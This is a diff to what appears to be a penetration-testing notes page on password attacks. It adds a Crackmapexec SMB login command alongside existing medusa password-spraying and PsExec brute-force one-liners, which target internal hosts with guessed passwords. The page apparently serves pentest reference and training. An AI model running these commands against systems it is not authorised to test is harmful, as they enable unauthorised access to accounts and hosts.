@@ -27,6 +27,12 @@ medusa -h 192.168.95.11 -U Common\ users\ list.txt -p Welcome1 -M smbnt -m GROUP
 ForEach ($file in (Get-Content "list.txt")) {write-host "Attempting user: $file" -ForegroundColor red ;.\PsExec.exe -u $file -p 'Password1' cmd.exe}
 ```
 
+### Crackmapexec
+
+```
+crackmapexec smb targets.txt -u "username" -p "password" --local-auth
+```
+
 ## Password cracking training
 
 {% embed url="https://in.security/technical-training/password-cracking/" %}
